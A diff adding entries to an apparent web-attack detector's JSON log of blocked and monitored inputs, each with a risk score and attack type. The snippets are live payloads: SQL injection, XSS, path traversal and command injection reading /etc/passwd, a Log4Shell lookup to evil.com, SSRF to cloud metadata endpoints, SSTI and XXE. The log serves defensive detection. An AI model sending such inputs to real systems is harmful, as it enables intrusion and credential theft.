@@ -4658,5 +4658,155 @@
     "attack_type": "ssrf",
     "reviewed": false,
     "promoted_to_rule": false
+  },
+  {
+    "timestamp": "2026-05-13T22:07:04Z",
+    "text_hash": "3a9d2c3c3a7c8793ae73f595a37ae3ca",
+    "text_snippet": "1' OR '1'='1 --",
+    "risk_score": 0.995,
+    "decision": "block",
+    "attack_type": "sql_injection",
+    "reviewed": false,
+    "promoted_to_rule": false
+  },
+  {
+    "timestamp": "2026-05-13T22:07:04Z",
+    "text_hash": "38fff51cb7248a06d6142c6bdf846831",
+    "text_snippet": "<script>alert(1)</script>",
+    "risk_score": 1.0,
+    "decision": "block",
+    "attack_type": "xss",
+    "reviewed": false,
+    "promoted_to_rule": false
+  },
+  {
+    "timestamp": "2026-05-13T22:07:04Z",
+    "text_hash": "7de27d3deb2aa12770aefbcf1bcca7bd",
+    "text_snippet": "1' OR '1'='1",
+    "risk_score": 0.9848787751910268,
+    "decision": "block",
+    "attack_type": "sql_injection",
+    "reviewed": false,
+    "promoted_to_rule": false
+  },
+  {
+    "timestamp": "2026-05-13T22:07:04Z",
+    "text_hash": "425be980bfb7680d223bc54a998d25a2",
+    "text_snippet": "../../etc/passwd",
+    "risk_score": 1.0,
+    "decision": "block",
+    "attack_type": "path_traversal",
+    "reviewed": false,
+    "promoted_to_rule": false
+  },
+  {
+    "timestamp": "2026-05-13T22:07:04Z",
+    "text_hash": "41ec6796ac7225bc7d24e0c26147697a",
+    "text_snippet": "; cat /etc/passwd",
+    "risk_score": 1.0,
+    "decision": "block",
+    "attack_type": "command_injection",
+    "reviewed": false,
+    "promoted_to_rule": false
+  },
+  {
+    "timestamp": "2026-05-13T22:07:04Z",
+    "text_hash": "7fd61bdd9e67b067baee63892425e2b6",
+    "text_snippet": "${jndi:ldap://evil.com/a}",
+    "risk_score": 1.0,
+    "decision": "block",
+    "attack_type": "log4shell",
+    "reviewed": false,
+    "promoted_to_rule": false
+  },
+  {
+    "timestamp": "2026-05-13T22:07:04Z",
+    "text_hash": "2ac0e8450882e7026fe16254736b901f",
+    "text_snippet": "http://169.254.169.254/latest/meta-data/",
+    "risk_score": 1.0,
+    "decision": "block",
+    "attack_type": "ssrf",
+    "reviewed": false,
+    "promoted_to_rule": false
+  },
+  {
+    "timestamp": "2026-05-13T22:07:04Z",
+    "text_hash": "9f74a092a2b9b7ccccaeb59eb79d5211",
+    "text_snippet": "{{config}}",
+    "risk_score": 1.0,
+    "decision": "block",
+    "attack_type": "ssti",
+    "reviewed": false,
+    "promoted_to_rule": false
+  },
+  {
+    "timestamp": "2026-05-13T22:07:04Z",
+    "text_hash": "6f67c54c1af4e21258e42e6516ede352",
+    "text_snippet": "<?xml><!ENTITY xxe SYSTEM 'file:///etc/passwd'>",
+    "risk_score": 0.92,
+    "decision": "block",
+    "attack_type": "xxe",
+    "reviewed": false,
+    "promoted_to_rule": false
+  },
+  {
+    "timestamp": "2026-05-13T22:21:12Z",
+    "text_hash": "3165078f1b9b74a14060f961d0a4478d",
+    "text_snippet": "http://127.0.0.1/admin",
+    "risk_score": 0.9992584692735107,
+    "decision": "block",
+    "attack_type": "ssrf",
+    "reviewed": false,
+    "promoted_to_rule": false
+  },
+  {
+    "timestamp": "2026-05-13T22:27:41Z",
+    "text_hash": "66bab3774cfd5aca596b1252a3303d0d",
+    "text_snippet": "http://metadata.google.internal",
+    "risk_score": 0.86,
+    "decision": "monitor",
+    "attack_type": "ssrf",
+    "reviewed": false,
+    "promoted_to_rule": false
+  },
+  {
+    "timestamp": "2026-05-13T22:27:45Z",
+    "text_hash": "37d007a56d816107ce5b52c10342db37",
+    "text_snippet": "http://localhost:8080",
+    "risk_score": 0.9700696334697055,
+    "decision": "block",
+    "attack_type": "ssrf",
+    "reviewed": false,
+    "promoted_to_rule": false
+  },
+  {
+    "timestamp": "2026-05-13T22:30:32Z",
+    "text_hash": "2de349009e43659d4cbdf0f7d7dc7583",
+    "text_snippet": "http://10.0.0.1",
+    "risk_score": 0.985,
+    "decision": "block",
+    "attack_type": "ssrf",
+    "reviewed": false,
+    "promoted_to_rule": false
+  },
+  {
+    "timestamp": "2026-05-13T22:30:36Z",
+    "text_hash": "fff57ce593f2abbebb468d32f24c5171",
+    "text_snippet": "http://192.168.1.1",
+    "risk_score": 0.9590747516661318,
+    "decision": "block",
+    "attack_type": "ssrf",
+    "reviewed": false,
+    "promoted_to_rule": false
+  },
+  {
+    "timestamp": "2026-05-13T22:33:05Z",
+    "text_hash": "3165078f1b9b74a14060f961d0a4478d",
+    "text_snippet": "http://127.0.0.1/admin",
+    "risk_score": 1.0,
+    "decision": "block",
+    "attack_type": "ssrf",
+    "reviewed": false,
+    "promoted_to_rule": false
   }
 ]
